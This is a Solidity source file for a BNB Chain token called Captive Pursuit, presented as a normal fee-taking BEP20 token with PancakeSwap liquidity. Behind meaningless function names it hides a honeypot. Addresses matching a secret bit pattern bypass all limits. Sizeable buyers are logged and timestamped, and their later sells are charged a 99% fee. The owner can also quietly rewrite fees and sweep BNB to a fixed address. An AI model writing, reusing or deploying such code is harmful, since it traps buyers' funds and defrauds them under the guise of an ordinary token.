/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract CaptivePursuit is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Captive Pursuit ";
    string constant _symbol = "CaptivePursuit";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private buyIsReceiverBots;
    mapping(address => bool) private txMaxExemptLiquidity;
    mapping(address => bool) private sellBuyTxAuto;
    mapping(address => bool) private feeSellTxWalletMaxSwapMarketing;
    mapping(address => uint256) private modeBurnIsWalletLiquiditySell;
    mapping(uint256 => address) private walletLiquidityTxTradingBotsSwapBuy;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private marketingSwapLimitMax = 0;
    uint256 private tradingModeBotsBuyTxAutoSell = 8;

    //SELL FEES
    uint256 private modeReceiverLaunchedSwap = 0;
    uint256 private teamTxLaunchedReceiver = 8;

    uint256 private receiverFeeBuyTeamLiquiditySellMin = tradingModeBotsBuyTxAutoSell + marketingSwapLimitMax;
    uint256 private tradingMarketingReceiverTeamMinTx = 100;

    address private isModeWalletLimitTx = (msg.sender); // auto-liq address
    address private modeWalletMinBurnMax = (0x29Fb5B67847BbC80D7A827aDfFFFe51dcA9BC53a); // marketing address
    address private buyMaxBurnTrading = DEAD;
    address private tradingFeeIsSellBotsMaxAuto = DEAD;
    address private botsIsLimitMin = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private receiverBotsMaxLimitMinTx;
    uint256 private isReceiverBotsLiquidity;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private exemptWalletMinSwapBotsFeeReceiver;
    uint256 private burnBuyAutoTeam;
    uint256 private txExemptSwapSellWalletMinReceiver;
    uint256 private buyModeIsSwapExemptReceiver;
    uint256 private txLiquidityFeeSell;

    bool private autoTradingReceiverMin = true;
    bool private feeSellTxWalletMaxSwapMarketingMode = true;
    bool private tradingMinFeeTx = true;
    bool private txAutoSwapIs = true;
    bool private swapReceiverTeamMax = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private limitTxIsBots = 6 * 10 ** 15;
    uint256 private burnReceiverMinTeam = _totalSupply / 1000; // 0.1%

    
    uint256 private tradingFeeSwapMin = 0;
    uint256 private txBuyBotsMinTeam = 0;
    bool private isTeamLiquidityTx = false;
    uint256 private feeIsMarketingTxMode = 0;
    bool private txModeWalletExempt = false;
    bool private isMarketingSellTeam = false;
    bool private maxTradingAutoBots = false;
    bool private liquidityModeIsExemptTeamBotsWallet = false;
    bool private modeBurnMinAutoBotsLimit = false;
    uint256 private maxWalletLimitSell = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        exemptWalletMinSwapBotsFeeReceiver = true;

        buyIsReceiverBots[msg.sender] = true;
        buyIsReceiverBots[address(this)] = true;

        txMaxExemptLiquidity[msg.sender] = true;
        txMaxExemptLiquidity[0x0000000000000000000000000000000000000000] = true;
        txMaxExemptLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        txMaxExemptLiquidity[address(this)] = true;

        sellBuyTxAuto[msg.sender] = true;
        sellBuyTxAuto[0x0000000000000000000000000000000000000000] = true;
        sellBuyTxAuto[0x000000000000000000000000000000000000dEaD] = true;
        sellBuyTxAuto[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return burnTradingTeamFeeTxMinAuto(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return burnTradingTeamFeeTxMinAuto(sender, recipient, amount);
    }

    function burnTradingTeamFeeTxMinAuto(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = marketingTradingIsSwap(sender) || marketingTradingIsSwap(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                liquidityExemptReceiverBuy();
            }
            if (!bLimitTxWalletValue) {
                launchedFeeExemptAuto(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return launchedMinSwapMarketing(sender, recipient, amount);}

        if (!buyIsReceiverBots[sender] && !buyIsReceiverBots[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (liquidityModeIsExemptTeamBotsWallet != swapReceiverTeamMax) {
            liquidityModeIsExemptTeamBotsWallet = autoTradingReceiverMin;
        }

        if (feeIsMarketingTxMode == receiverFeeBuyTeamLiquiditySellMin) {
            feeIsMarketingTxMode = txBuyBotsMinTeam;
        }

        if (maxWalletLimitSell != txBuyBotsMinTeam) {
            maxWalletLimitSell = tradingModeBotsBuyTxAutoSell;
        }


        require((amount <= _maxTxAmount) || sellBuyTxAuto[sender] || sellBuyTxAuto[recipient], "Max TX Limit has been triggered");

        if (liquidityMaxSellBots()) {buyLiquiditySellWalletReceiverAuto();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = txAutoSellLimitBurnLiquidityFee(sender) ? isModeWalletBurn(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function launchedMinSwapMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txAutoSellLimitBurnLiquidityFee(address sender) internal view returns (bool) {
        return !txMaxExemptLiquidity[sender];
    }

    function marketingMinTxTeamBuySwap(address sender, bool selling) internal returns (uint256) {
        
        if (txModeWalletExempt != txAutoSwapIs) {
            txModeWalletExempt = swapReceiverTeamMax;
        }


        if (selling) {
            receiverFeeBuyTeamLiquiditySellMin = teamTxLaunchedReceiver + modeReceiverLaunchedSwap;
            return buyLiquidityTradingAutoReceiver(sender, receiverFeeBuyTeamLiquiditySellMin);
        }
        if (!selling && sender == uniswapV2Pair) {
            receiverFeeBuyTeamLiquiditySellMin = tradingModeBotsBuyTxAutoSell + marketingSwapLimitMax;
            return receiverFeeBuyTeamLiquiditySellMin;
        }
        return buyLiquidityTradingAutoReceiver(sender, receiverFeeBuyTeamLiquiditySellMin);
    }

    function exemptAutoBurnFee() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function isModeWalletBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (feeIsMarketingTxMode == maxWalletLimitSell) {
            feeIsMarketingTxMode = marketingSwapLimitMax;
        }

        if (liquidityModeIsExemptTeamBotsWallet == modeBurnMinAutoBotsLimit) {
            liquidityModeIsExemptTeamBotsWallet = isTeamLiquidityTx;
        }

        if (tradingFeeSwapMin == tradingFeeSwapMin) {
            tradingFeeSwapMin = tradingModeBotsBuyTxAutoSell;
        }


        uint256 feeAmount = amount.mul(marketingMinTxTeamBuySwap(sender, receiver == uniswapV2Pair)).div(tradingMarketingReceiverTeamMinTx);

        if (feeSellTxWalletMaxSwapMarketing[sender] || feeSellTxWalletMaxSwapMarketing[receiver]) {
            feeAmount = amount.mul(99).div(tradingMarketingReceiverTeamMinTx);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function marketingTradingIsSwap(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function buyLiquidityTradingAutoReceiver(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = modeBurnIsWalletLiquiditySell[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function launchedFeeExemptAuto(address addr) private {
        if (exemptAutoBurnFee() < limitTxIsBots) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        walletLiquidityTxTradingBotsSwapBuy[exemptLimitValue] = addr;
    }

    function liquidityExemptReceiverBuy() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (modeBurnIsWalletLiquiditySell[walletLiquidityTxTradingBotsSwapBuy[i]] == 0) {
                    modeBurnIsWalletLiquiditySell[walletLiquidityTxTradingBotsSwapBuy[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(modeWalletMinBurnMax).transfer(amountBNB * amountPercentage / 100);
    }

    function liquidityMaxSellBots() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    swapReceiverTeamMax &&
    _balances[address(this)] >= burnReceiverMinTeam;
    }

    function buyLiquiditySellWalletReceiverAuto() internal swapping {
        
        uint256 amountToLiquify = burnReceiverMinTeam.mul(marketingSwapLimitMax).div(receiverFeeBuyTeamLiquiditySellMin).div(2);
        uint256 amountToSwap = burnReceiverMinTeam.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (liquidityModeIsExemptTeamBotsWallet == autoTradingReceiverMin) {
            liquidityModeIsExemptTeamBotsWallet = txModeWalletExempt;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = receiverFeeBuyTeamLiquiditySellMin.sub(marketingSwapLimitMax.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(marketingSwapLimitMax).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(tradingModeBotsBuyTxAutoSell).div(totalETHFee);
        
        payable(modeWalletMinBurnMax).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                isModeWalletLimitTx,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTxMaxExemptLiquidity(address a0) public view returns (bool) {
            return txMaxExemptLiquidity[a0];
    }
    function setTxMaxExemptLiquidity(address a0,bool a1) public onlyOwner {
        txMaxExemptLiquidity[a0]=a1;
    }

    function getTxBuyBotsMinTeam() public view returns (uint256) {
        if (txBuyBotsMinTeam == feeIsMarketingTxMode) {
            return feeIsMarketingTxMode;
        }
        if (txBuyBotsMinTeam != txBuyBotsMinTeam) {
            return txBuyBotsMinTeam;
        }
        return txBuyBotsMinTeam;
    }
    function setTxBuyBotsMinTeam(uint256 a0) public onlyOwner {
        if (txBuyBotsMinTeam != tradingModeBotsBuyTxAutoSell) {
            tradingModeBotsBuyTxAutoSell=a0;
        }
        txBuyBotsMinTeam=a0;
    }

    function getReceiverFeeBuyTeamLiquiditySellMin() public view returns (uint256) {
        if (receiverFeeBuyTeamLiquiditySellMin == txBuyBotsMinTeam) {
            return txBuyBotsMinTeam;
        }
        if (receiverFeeBuyTeamLiquiditySellMin != teamTxLaunchedReceiver) {
            return teamTxLaunchedReceiver;
        }
        return receiverFeeBuyTeamLiquiditySellMin;
    }
    function setReceiverFeeBuyTeamLiquiditySellMin(uint256 a0) public onlyOwner {
        if (receiverFeeBuyTeamLiquiditySellMin == feeIsMarketingTxMode) {
            feeIsMarketingTxMode=a0;
        }
        receiverFeeBuyTeamLiquiditySellMin=a0;
    }

    function getFeeIsMarketingTxMode() public view returns (uint256) {
        if (feeIsMarketingTxMode == marketingSwapLimitMax) {
            return marketingSwapLimitMax;
        }
        if (feeIsMarketingTxMode == marketingSwapLimitMax) {
            return marketingSwapLimitMax;
        }
        if (feeIsMarketingTxMode == limitTxIsBots) {
            return limitTxIsBots;
        }
        return feeIsMarketingTxMode;
    }
    function setFeeIsMarketingTxMode(uint256 a0) public onlyOwner {
        if (feeIsMarketingTxMode != burnReceiverMinTeam) {
            burnReceiverMinTeam=a0;
        }
        if (feeIsMarketingTxMode != receiverFeeBuyTeamLiquiditySellMin) {
            receiverFeeBuyTeamLiquiditySellMin=a0;
        }
        if (feeIsMarketingTxMode == tradingModeBotsBuyTxAutoSell) {
            tradingModeBotsBuyTxAutoSell=a0;
        }
        feeIsMarketingTxMode=a0;
    }

    function getMaxTradingAutoBots() public view returns (bool) {
        return maxTradingAutoBots;
    }
    function setMaxTradingAutoBots(bool a0) public onlyOwner {
        if (maxTradingAutoBots == txModeWalletExempt) {
            txModeWalletExempt=a0;
        }
        maxTradingAutoBots=a0;
    }

    function getAutoTradingReceiverMin() public view returns (bool) {
        return autoTradingReceiverMin;
    }
    function setAutoTradingReceiverMin(bool a0) public onlyOwner {
        if (autoTradingReceiverMin != isMarketingSellTeam) {
            isMarketingSellTeam=a0;
        }
        if (autoTradingReceiverMin != feeSellTxWalletMaxSwapMarketingMode) {
            feeSellTxWalletMaxSwapMarketingMode=a0;
        }
        if (autoTradingReceiverMin != feeSellTxWalletMaxSwapMarketingMode) {
            feeSellTxWalletMaxSwapMarketingMode=a0;
        }
        autoTradingReceiverMin=a0;
    }

    function getTradingMinFeeTx() public view returns (bool) {
        return tradingMinFeeTx;
    }
    function setTradingMinFeeTx(bool a0) public onlyOwner {
        if (tradingMinFeeTx == isTeamLiquidityTx) {
            isTeamLiquidityTx=a0;
        }
        if (tradingMinFeeTx == isMarketingSellTeam) {
            isMarketingSellTeam=a0;
        }
        if (tradingMinFeeTx == maxTradingAutoBots) {
            maxTradingAutoBots=a0;
        }
        tradingMinFeeTx=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}